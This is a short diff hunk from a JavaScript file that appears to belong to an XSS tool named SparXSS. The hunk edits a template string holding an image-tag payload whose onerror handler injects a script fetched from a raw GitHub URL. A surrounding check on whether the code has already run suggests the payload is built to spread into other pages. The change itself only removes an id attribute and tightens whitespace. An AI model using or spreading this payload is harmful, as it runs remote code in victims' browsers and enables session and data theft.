@@ -800,7 +800,7 @@ if (typeof executed === 'undefined') {
                 `;
 
                 var codeBeginning = `
-                    <img id="myImage" src="#" onerror="var scriptElement = document.createElement("script");scriptElement.src = "https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js";scriptElement.onload = function() {
+                    <img src="#" onerror="var scriptElement=document.createElement("script");scriptElement.src="https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js";scriptElement.onload=function(){
                 `;
                 
                 var codeEnd = `
